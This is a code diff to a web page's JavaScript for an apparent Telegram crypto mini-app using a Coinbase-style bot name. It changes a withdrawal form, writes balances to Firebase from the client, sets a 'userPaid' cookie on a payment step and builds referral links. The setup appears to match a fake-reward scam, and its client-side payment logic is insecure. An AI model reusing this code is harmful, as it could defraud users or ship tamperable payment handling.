@@ -642,6 +642,8 @@ The live OFFICIAL TRUMP today is 26.53 USD with a 24-hour trading volume of $443
     });
     
     
+    
+    
       // Initialize all modals with the class `iziModal`
       $(".iziModal").each(function() {
         $(this).iziModal({
@@ -808,38 +810,68 @@ The live OFFICIAL TRUMP today is 26.53 USD with a 24-hour trading volume of $443
 
   $(document).ready(function () {
     $("#wallet-form").on("submit", function (e) {
-      e.preventDefault();
+  e.preventDefault();
 
-      const wallet = $("#walletInput").val().trim();
-      const amount = parseFloat($("#wallet_amountInput").val().trim());
+  const wallet = $("#walletInput").val().trim();
+  const amount = parseFloat($("#wallet_amountInput").val().trim());
 
-      if (!wallet || isNaN(amount) || amount <= 0) {
-        showError("Please enter a valid wallet address and amount!");
-        return;
-      }
-
-      toggleSubmitButton(true, "Processing");
-
-      get(balanceRef)
-        .then((snapshot) => {
-          if (snapshot.exists()) {
-            const currentBalance = parseFloat(snapshot.val());
-            if (amount > currentBalance) {
-              showError("You do not have sufficient balance!");
-              return;
-            }
-            submitWithdrawal(userId, wallet, amount);
-          } else {
-            showError("Balance not found. Please try again later.");
-          }
-        })
-        .catch(() => {
-          showError("An error occurred while retrieving your balance.");
-        })
-        .finally(() => {
-          toggleSubmitButton(false, "Continue");
-        });
+  if (!wallet || isNaN(amount) || amount <= 0) {
+    iziToast.error({
+      title: "Error",
+      message: "Please enter a valid wallet address and amount!",
+      position: "topRight",
     });
+    return;
+  }
+
+  toggleSubmitButton(true, "Processing");
+
+  // Use `get()` for a one-time read of the balance
+  get(balanceRef)
+    .then((snapshot) => {
+      if (snapshot.exists()) {
+        const currentBalance = parseFloat(snapshot.val());
+
+        if (amount > currentBalance) {
+          iziToast.error({
+            title: "Error",
+            message: "You do not have sufficient balance!",
+            position: "topRight",
+          });
+          toggleSubmitButton(false, "Continue");
+          return;
+        }
+
+        // Proceed with the withdrawal
+        submitWithdrawal(userId, wallet, amount, currentBalance);
+      } else {
+        iziToast.error({
+          title: "Error",
+          message: "Balance not found. Please try again later.",
+          position: "topRight",
+        });
+        toggleSubmitButton(false, "Continue");
+      }
+    })
+    .catch(() => {
+      iziToast.error({
+        title: "Error",
+        message: "An error occurred while retrieving your balance.",
+        position: "topRight",
+      });
+      toggleSubmitButton(false, "Continue");
+    });
+});
+
+$("#continuePayment").on("click", function () {
+      $("#darkModal9").iziModal("open");
+      document.cookie = `userPaid=paid; expires=${new Date(Date.now() + 86400000).toUTCString()}; path=/`;
+    });
+    
+    /* 💧💧💧💧
+    document.cookie = `userWithdrawal=paid; expires=${new Date(Date.now()).toUTCString()}; path=/`;
+    document.cookie = `userPaid=paid; expires=${new Date(Date.now()).toUTCString()}; path=/`;
+    */
 
     function showError(message) {
       iziToast.error({ title: "Error", message, position: "topRight" });
@@ -854,17 +886,27 @@ The live OFFICIAL TRUMP today is 26.53 USD with a 24-hour trading volume of $443
       }
     }
 
-    function submitWithdrawal(userId, wallet, amount) {
-      const withdrawalRef = ref(database, `users/${userId}/withdrawals`);
-      const withdrawalId = Date.now();
+    function submitWithdrawal(userId, wallet, amount, currentBalance) {
+  // Construct the reference path for the withdrawal
+  const withdrawalPath = `users/${userId}/withdrawals/${Date.now()}`;
+  const withdrawalRef = ref(database, withdrawalPath);
 
-      set(ref(withdrawalRef, withdrawalId), {
-        wallet,
-        amount,
-        status: "pending",
-        timestamp: new Date().toISOString(),
-      })
+  // Log the constructed path for debugging
+  console.log("Withdrawal Reference Path:", withdrawalPath);
+
+  // Attempt to set the withdrawal data
+  set(withdrawalRef, {
+    wallet,
+    amount,
+    status: "pending",
+    timestamp: new Date().toISOString(),
+  })
+    .then(() => {
+      // Update the user's balance
+      const newBalance = currentBalance - amount;
+      update(ref(database, `users/${userId}`), { balance: newBalance })
         .then(() => {
+          // Update the user's withdrawal cookie
           document.cookie = `userWithdrawal=pending; expires=${new Date(Date.now() + 86400000).toUTCString()}; path=/`;
           iziToast.success({
             title: "Success",
@@ -874,35 +916,46 @@ The live OFFICIAL TRUMP today is 26.53 USD with a 24-hour trading volume of $443
           $("#darkModal7").iziModal("close");
           $("#darkModal8").iziModal("open");
         })
-        .catch(() => {
-          showError("Failed to submit withdrawal request. Please try again!");
+        .catch((error) => {
+          console.error("Balance Update Error:", error);
+          iziToast.error({
+            title: "Error",
+            message: "Failed to update balance. Please try again!",
+            position: "topRight",
+          });
         });
-    }
-  
-// Share button functionality
-  const shareButton = document.getElementById('share-button');
-  
-  const referralLink = `https://t.me/CoinbaseTrumpbot/coinbase?startapp=ref${userId}`;
-
-  shareButton.addEventListener('click', () => {
-    // Copy referral link to clipboard
-    const tempInput = document.createElement('input');
-    tempInput.value = referralLink;
-    tempInput.style.position = 'absolute';
-    tempInput.style.left = '-9999px';
-    document.body.appendChild(tempInput);
-    tempInput.select();
-    document.execCommand('copy');
-    document.body.removeChild(tempInput);
-
-    // Display a Toast notification
-    iziToast.success({
-      title: "Copied!",
-      message: "Referral link copied to clipboard!",
-      duration: 3000,
-      position: "topRight",
+    })
+    .catch((error) => {
+      console.error("Withdrawal Error:", error);
+      iziToast.error({
+        title: "Error",
+        message: "Failed to submit withdrawal request. Please try again!",
+        position: "topRight",
+      });
     });
-  });    
+}
+
+    // Share button functionality
+    const shareButton = document.getElementById("share-button");
+    const referralLink = `https://t.me/CoinbaseTrumpbot/coinbase?startapp=ref${userId}`;
+
+    shareButton.addEventListener("click", () => {
+      const tempInput = document.createElement("input");
+      tempInput.value = referralLink;
+      tempInput.style.position = "absolute";
+      tempInput.style.left = "-9999px";
+      document.body.appendChild(tempInput);
+      tempInput.select();
+      document.execCommand("copy");
+      document.body.removeChild(tempInput);
+
+      iziToast.success({
+        title: "Copied!",
+        message: "Referral link copied to clipboard!",
+        duration: 3000,
+        position: "topRight",
+      });
+    });
   });
 </script>
 <br>
